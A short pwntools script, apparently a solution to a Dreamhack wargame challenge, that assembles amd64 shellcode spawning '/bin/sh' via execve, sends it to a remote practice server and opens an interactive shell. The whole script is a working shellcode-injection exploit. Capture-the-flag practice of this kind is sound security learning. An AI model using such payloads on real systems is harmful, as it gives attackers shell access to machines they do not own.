from pwn import *

context_level = 'debug'
#context.terminal = ["tmux", "new-window"]
shellcode = asm("""
                or rax, 59
                lea rdi, [rip + binsh]
                syscall
                binsh:
                        .asciz "/bin/sh"
                """, arch = 'amd64', os = 'linux')

#r = process('./main')
r = remote('host3.dreamhack.games', 23246)
r.recvuntil(b'Give me your shellcode > ')
r.sendline(shellcode)
r.interactive()